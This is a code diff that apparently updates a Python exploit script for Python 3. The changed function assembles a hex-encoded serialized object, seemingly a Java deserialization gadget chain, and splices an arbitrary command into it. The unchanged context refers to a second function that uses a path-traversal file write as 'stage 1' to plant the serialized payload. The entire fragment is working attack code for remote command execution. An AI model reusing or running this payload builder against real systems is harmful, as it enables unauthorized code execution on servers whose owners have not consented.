@@ -438,12 +438,12 @@ def _get_payload(c):
     p += "000600010000003b000e0000000c000100000005000f00120000000200130000"
     p += "0002001400110000000a000100020016001000097074000450776e7270770100"
     p += "7871007e000d78"
-    obj = bytearray(p.decode("hex"))
+    obj = bytearray(bytes.fromhex(p))
     obj[0x240:0x242] = struct.pack(">H", len(c) + 0x694)
     obj[0x6e5:0x6e7] = struct.pack(">H", len(c))
     start = obj[:0x6e7]
     end = obj[0x6e7:]
-    return start + c + end
+    return start + str.encode(c) + end
 
 def we_can_plant_serialized(t, c):
     # stage 1 - traversal file write primitive
